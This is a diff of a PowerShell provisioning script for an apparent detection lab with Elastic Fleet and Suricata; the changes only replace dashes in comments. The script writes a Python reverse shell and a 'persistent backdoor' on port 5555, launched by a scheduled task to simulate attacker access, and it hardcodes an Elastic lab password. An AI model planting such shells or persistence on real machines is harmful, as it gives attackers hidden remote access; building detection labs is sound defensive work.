@@ -33,7 +33,7 @@ s.close()
 "@
 [System.IO.File]::WriteAllText("C:\Users\vagrant\lab\reverse.py", $reverseShell)
 
-# Backdoor pérenne — même logique, port différent (5555) pour simuler un second accès
+# Backdoor pérenne -- même logique, port différent (5555) pour simuler un second accès
 $svcShell = @"
 import socket, subprocess
 
@@ -52,7 +52,7 @@ s.close()
 "@
 [System.IO.File]::WriteAllText("C:\Users\vagrant\lab\svc.py", $svcShell)
 
-# Lanceur batch — utilisé par la tâche planifiée (évite les guillemets imbriqués dans schtasks)
+# Lanceur batch -- utilisé par la tâche planifiée (évite les guillemets imbriqués dans schtasks)
 [System.IO.File]::WriteAllText("C:\Users\vagrant\lab\launch.bat",
     "C:\Users\vagrant\lab\pyembed\python.exe C:\Users\vagrant\lab\svc.py`r`n")
 
@@ -110,7 +110,7 @@ for ($i = 0; $i -lt 60; $i++) {
 if (-not $fleetReady) { throw "Fleet Server not reachable after 300s" }
 
 # Récupère le jeton d'enrôlement pour la politique "Windows Endpoints"
-# L'API ne supporte pas le filtre par policy_id en query param — on filtre côté client
+# L'API ne supporte pas le filtre par policy_id en query param -- on filtre côté client
 $headers = @{
     "kbn-xsrf"      = "true"
     "Authorization" = "Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("elastic:vagrant"))
@@ -132,7 +132,7 @@ if ([string]::IsNullOrWhiteSpace($token)) { throw "Enrollment token not found fo
   --insecure --non-interactive
 
 # Route all internet traffic through Debian so Suricata can inspect it.
-# Done last — all provisioning downloads already used the VirtualBox NAT adapter.
+# Done last -- all provisioning downloads already used the VirtualBox NAT adapter.
 cmd /c "route delete 0.0.0.0 mask 0.0.0.0"
 cmd /c "route add 0.0.0.0 mask 0.0.0.0 10.10.1.1 -p"
-Write-Host "Default route set to Debian (10.10.1.1) — Suricata will see all traffic"
+Write-Host "Default route set to Debian (10.10.1.1) -- Suricata will see all traffic"
